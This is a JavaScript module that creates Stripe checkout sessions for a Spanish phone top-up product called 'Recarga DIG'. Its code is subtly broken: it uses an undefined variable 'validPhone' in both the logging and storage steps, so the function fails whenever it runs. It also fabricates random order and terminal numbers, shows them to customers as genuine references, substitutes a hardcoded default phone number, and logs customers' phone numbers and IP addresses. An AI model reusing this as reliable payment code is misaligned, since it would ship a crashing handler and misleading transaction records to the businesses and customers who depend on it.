const { STRIPE_SECRET_KEY, MIRROR_DOMAIN } = require('./constants');
const storage = require('../db/storage');
const fetch = require('node-fetch');

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Debug the incoming phone number
    console.log('STRIPE RECEIVED RAW:', typeof phoneNumber, phoneNumber);
    
    // Use any phone number we received, or use default if truly empty/null
    let phoneToUse;
    
    if (phoneNumber === null || phoneNumber === undefined || phoneNumber === '') {
      // If we have nothing, use default
      phoneToUse = '624048596';
      console.log('Using default phone:', phoneToUse);
    } else {
      // Use whatever was passed, cleaning it if it's a string
      if (typeof phoneNumber === 'string') {
        phoneToUse = phoneNumber.replace(/[^0-9]/g, '');
      } else {
        // If it's not a string (maybe number or object), convert to string
        phoneToUse = String(phoneNumber);
      }
      console.log('Using provided phone:', phoneToUse);
    }

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    // Force description to always have a phone number
    const description = `*Número de teléfono*: ${phoneToUse}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`;
    console.log('Stripe description being used:', description);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIG');
    params.append('line_items[0][price_data][product_data][description]', description);

    console.log('Creating Stripe session with data:', {
      amount: priceInCents / 100,
      phoneNumber: validPhone,
      orderNumber: orderNumber,
      terminal: numberOfTerminal,
      clientIP: clientIP
    });

    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Stripe API error:', errorText);
      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
    }

    const session = await response.json();

    await storage.setPaymentData(session.id, {
      phoneNumber: validPhone,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    });

    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

module.exports = {
  createStripeCheckoutSession
};